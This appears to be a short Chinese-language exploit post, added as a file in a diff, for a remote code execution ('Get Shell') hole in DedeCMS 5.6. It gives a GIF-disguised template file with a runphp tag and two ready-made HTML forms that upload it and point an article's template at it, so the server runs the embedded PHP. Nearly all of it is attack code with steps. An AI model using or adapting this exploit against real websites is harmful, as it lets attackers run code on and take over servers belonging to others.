@@ -1,0 +1,41 @@
+[DEDECMS网站管理系统Get Shell漏洞 全文]
+Gif89a{dede:field name=''toby57'' runphp=''yes''}
+phpinfo();
+{/dede:field}
+保存为1.gif
+
+   1.  <form action="http://192.168.1.5/DedeCmsV5.6-GBK-Final/uploads/member/uploads_edit.php" method="post" enctype="multipart/form-data" ">  
+   2. <input type="hidden" name="aid" value="7" />  
+   3. <input type="hidden" name="mediatype" value="1" />  
+   4. <input type="text" name="oldurl" value="/DedeCmsV5.6-GBK-Final/uploads/uploads/userup/3/1.gif" /></br>  
+   5. <input type="hidden" name="dopost" value="save" />  
+   6. <input name="title" type="hidden" id="title" value="1.jpg" class="intxt"/>  
+   7. <input name="addonfile" type="file" id="addonfile"/>  
+   8. <button class="button2" type="submit" >更改</button>  
+   9. </form>  
+
+构造如上表单，上传后图片保存为/uploads/userup/3/1.gif
+发表文章，然后构造修改表单如下：
+ 
+ 
+
+   1. <form  action="http://192.168.1.5/DedeCmsV5.6-GBK-Final/uploads/member/article_edit.php" method="post" enctype="multipart/form-data">  
+   2. <input type="hidden" name="dopost" value="save" />  
+   3. <input type="hidden" name="aid" value="2" />  
+   4. <input type="hidden" name="idhash" value="ec66030e619328a6c5115b55483e8dbd" />  
+   5. <input type="hidden" name="channelid" value="1" />  
+   6. <input type="hidden" name="oldlitpic" value="" />  
+   7. <input type="hidden" name="sortrank" value="1282049150" />     
+   8. <input  name="title" type="text" id="title" value="aaaaaaaaaaaaaaa" maxlength="100" class="intxt"/>  
+   9. <input type="text" name="writer" id="writer" value="123456" maxlength="100" class="intxt" style="width:219px"/>  
+  10. <select name=''typeid'' size=''1''>  
+  11. <option value=''1'' class=''option3'' selected=''''>Test</option>  
+  12. <select name=''mtypesid'' size=''1''>  
+  13. <option value=''0'' selected>请选择分类...</option>  
+  14. <option value=''1'' class=''option3'' selected>aa</option></select>   
+  15. <textarea name="description" id="description">aaaaaaaaaaaaa</textarea>  
+  16. <input type=''hidden'' name=''dede_addonfields'' value="templet">  
+  17. <input type=''hidden'' name=''templet'' value="../uploads/userup/3/1.gif">  
+  18. <input type="hidden" id="body" name="body" value="aaaa" style="display:none" />  
+  19. <button class="button2" type="submit">提交</button>  
+  20. </form> 
